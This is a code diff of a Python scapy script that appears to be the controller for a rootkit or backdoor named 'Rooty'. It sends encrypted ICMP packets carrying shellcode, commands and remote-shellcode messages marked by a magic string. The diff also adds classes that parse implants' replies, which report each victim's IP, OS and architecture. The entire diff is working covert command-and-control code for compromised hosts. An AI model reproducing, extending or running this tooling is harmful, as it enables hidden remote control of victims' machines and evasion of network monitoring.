@@ -2,10 +2,19 @@ from scapy.all import *
 import _thread
 import getopt
 import struct
+import hexdump
 
-MSG_TYPE_SHELLCODE = '\x01'
-MSG_TYPE_COMMAND = '\x02'
-MSG_TYPE_REMOTE_SHELLCODE = '\x03'
+from termcolor import colored
+
+MSG_TYPE_RESPONSE =             0x00
+MSG_TYPE_SHELLCODE =            0x01
+MSG_TYPE_COMMAND =              0x02
+MSG_TYPE_REMOTE_SHELLCODE =     0x03
+
+MSG_ARCH_X64=                   0x10
+MSG_OS_WINDOWS=                 0x20
+MSG_OS_BSD=                     0x40
+MSG_OS_LINUX=                   0x80
 
 magic = b"GOATSE"
 src_ip = ""
@@ -13,6 +22,57 @@ dst_ip = ""
 shellcode_file = ""
 block_size = 128
 interface=None
+
+class RootyMessageException(Exception):
+    pass
+
+class SystemInformation():
+    def __init__(self, ip, arch, os):
+        self.ip = ip
+        self.arch = arch
+        self.os = os
+
+    def __str__(self):
+        res = "{}".format(self.ip)
+
+        if self.os == MSG_OS_WINDOWS:
+            res += " Windows"
+        elif self.os == MSG_OS_BSD:
+            res += " BSD"
+        elif self.os == MSG_OS_LINUX:
+            res += " Linux"
+        else:
+            res += " Unknown"
+
+        if self.arch  == MSG_ARCH_X64:
+            res += " X64"
+        else:
+            res += " i386"
+
+        return res
+       
+class RootyMessage():
+    def __init__(self, pkt):
+        global magic, block_size
+
+        if len(pkt.load) > 0 and (len(pkt.load) % block_size == 0):
+            data = crypt_data(pkt.load[block_size:], pkt.load[:block_size])
+
+            if data.startswith(magic):
+                self.source = SystemInformation(pkt[IP].src, data[6] & 0x10, data[6] & 0xE0)
+                self.message_type = data[6] & 0x0F
+                self.data_len = struct.unpack('<H', data[7:9])[0] 
+                self.data = data[9:9 + self.data_len].decode()
+                return
+                
+        raise RootyMessageException()
+
+    def display(self):
+        print("="*50)
+
+        for attr in ['source', 'message_type', 'data_len']:
+            print("{}: {}".format(attr, getattr(self, attr)))
+        hexdump.hexdump(self.data.encode())
 
 ########## functions ############
 def usage(err=None):
@@ -85,15 +145,15 @@ def build_pkt(src, dst, data):
     return ip/ICMP(type=8, code=0, id=random.randint(0, 65535))/data
 
 def sniff_packet(pkt):
-    global magic, block_size
+    try:
+        msg = RootyMessage(pkt)
+        
+        if msg.message_type == MSG_TYPE_RESPONSE:
+            print('{}: {}'.format(colored(msg.source, 'green'), msg.data), end='')
 
-    if ICMP in pkt and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
-        if len(pkt.load) > 0 and (len(pkt.load) % block_size == 0):
-            data = crypt_data(pkt.load[block_size:], pkt.load[:block_size])
+    except RootyMessageException:
+        pass
 
-            if data.startswith(magic):
-                if data[6] == 0x00:
-                    print(data[len(magic) + 3:].decode(), end='')
 
 def start_listener():
     global interface
